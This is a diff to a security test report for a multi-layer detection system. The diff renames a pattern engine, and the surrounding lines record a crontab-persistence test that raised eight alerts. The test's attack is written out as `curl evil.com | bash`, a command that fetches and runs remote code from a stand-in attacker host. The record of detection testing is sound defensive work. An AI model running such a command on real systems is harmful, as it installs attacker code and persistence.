@@ -52,7 +52,7 @@
 - **Attack:** Install malicious crontab with `curl evil.com | bash`
 - **Expected:** Persistence/tampering alert
 - **Actual:** **8 alerts from 3 layers:**
-  - SecureClaw patterns: crontab modification + remote code execution (`curl|bash`)
+  - BarnacleDefense patterns: crontab modification + remote code execution (`curl|bash`)
   - Behavior classifier: `[BEHAVIOR:SEC_TAMPER]`
   - Policy engine: `[POLICY:block-data-exfiltration]` + `[POLICY:detect-crontab-modification]`
 - **Verdict:** ✅ DETECTED — Defense in depth at its best
@@ -102,7 +102,7 @@
 
 ## Notable Findings
 
-1. **Multi-layer detection works.** Tests 3, 5, and 6 triggered alerts from multiple independent detection systems (policy engine, behavior classifier, SecureClaw patterns). No single point of failure.
+1. **Multi-layer detection works.** Tests 3, 5, and 6 triggered alerts from multiple independent detection systems (policy engine, behavior classifier, BarnacleDefense patterns). No single point of failure.
 
 2. **Defense in depth is real.** The crontab test (TEST 6) generated 8 alerts from 3 layers. An attacker would need to evade all of them.
 
